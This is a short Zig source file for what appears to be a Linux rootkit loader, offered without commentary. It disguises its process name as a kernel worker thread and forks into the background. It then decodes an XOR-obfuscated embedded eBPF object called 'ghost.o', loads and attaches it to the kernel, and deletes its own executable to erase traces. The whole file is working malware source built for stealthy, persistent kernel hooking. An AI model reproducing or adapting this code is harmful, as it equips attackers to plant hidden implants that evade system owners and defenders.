const std = @import("std");
const sc = @import("syscalls.zig");

pub fn _start() noreturn {
    var s_buf: [32]u8 = undefined;
    s_buf[0] = 'k'; s_buf[1] = 'w'; s_buf[2] = 'o'; s_buf[3] = 'r';
    s_buf[4] = 'k'; s_buf[5] = 'e'; s_buf[6] = 'r'; s_buf[7] = '/';
    s_buf[8] = 'u'; s_buf[9] = '1'; s_buf[10] = '1'; s_buf[11] = ':';
    s_buf[12] = '1'; s_buf[13] = 0;

    _ = sc.prctl(15, @intFromPtr(&s_buf), 0, 0, 0);

    const pid = sc.fork();
    if (pid != 0) sc.exit(0);

    var bpf_blob = @constCast(@embedFile("../target/ghost.o").*);
    comptime var i: usize = 0;
    inline while (i < bpf_blob.len) : (i += 1) {
        bpf_blob[i] ^= 0x5F;
    }

    const prog_fd = sc.bpf_load(5, &bpf_blob, bpf_blob.len);
    
    const link_attr = struct {
        prog_fd: u32,
        target_fd: u32,
        attach_type: u32,
    }{
        .prog_fd = @intCast(prog_fd),
        .target_fd = 1, 
        .attach_type = 37,
    };

    _ = sc.bpf_call(28, &link_attr, 12);

    const self_path = "/proc/self/exe";
    _ = sc.unlink(self_path);

    sc.exit(0);
}
